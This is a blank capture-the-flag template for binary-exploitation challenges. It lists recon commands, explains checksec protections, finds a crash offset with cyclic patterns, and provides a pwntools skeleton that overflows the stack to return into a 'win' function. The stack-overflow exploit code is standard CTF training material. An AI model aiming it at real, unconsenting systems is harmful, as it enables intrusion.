# 💥 Pwn / Binary Exploitation — Challenge Notes Template

## Challenge Info
- **Name:** 
- **Points:** 
- **Binary:** 
- **Remote:** `nc HOST PORT`
- **Description:** 

---

## Step 1 — Recon the Binary

```bash
# Run auto-recon
python3 scripts/recon.py ./binary --mode pwn

# Manual checks
file ./binary
checksec --file=./binary
strings ./binary | grep -iE "flag|win|shell|password|system"
nm ./binary | grep -iE "win|flag|shell|system|gets|scanf"
```

### Checksec Output Meaning

| Protection | Value | Meaning |
|------------|-------|---------|
| RELRO | Full | GOT is read-only (harder) |
| Stack Canary | No | Classic BOF possible ✅ |
| NX | Disabled | Shellcode on stack possible ✅ |
| PIE | No PIE | Fixed addresses — no ASLR ✅ |
| ASLR | Off | Fixed libc addresses ✅ |

---

## Step 2 — Find the Vulnerability

```bash
# Run it and see what happens
./binary

# Send lots of input to trigger crash
python3 -c "print('A'*200)" | ./binary

# Find exact offset
python3 -c "
from pwn import *
print(cyclic(200).decode())
" | ./binary

# After crash — find offset from core dump or GDB
python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
```

---

## Step 3 — Build the Exploit

```python
from pwn import *

# ─── Setup ───────────────────────────────────────────────
binary = './binary'
elf    = ELF(binary)
context.binary = elf
# libc = ELF('./libc.so.6')  # if provided

# ─── Local vs Remote ─────────────────────────────────────
LOCAL = True
if LOCAL:
    io = process(binary)
else:
    io = remote('HOST', PORT)

# ─── Gadgets / Addresses ─────────────────────────────────
# elf.symbols['win']       → address of win function
# elf.plt['system']        → system@plt
# elf.got['puts']          → puts@got (for leaking)
# next(elf.search(b'/bin/sh')) → /bin/sh string

win_addr = elf.symbols['win']
offset   = 72  # bytes until return address

# ─── Payload ─────────────────────────────────────────────
payload  = b'A' * offset
payload += p64(win_addr)

# ─── Send ────────────────────────────────────────────────
io.sendlineafter(b'> ', payload)
io.interactive()
```

---

## Notes & Progress

```
[Vulnerability] 

[Offset]        

[Protections]   

[Approach]      

[Solution]      
```

---

## Flag
```
CTF{                                    }
```
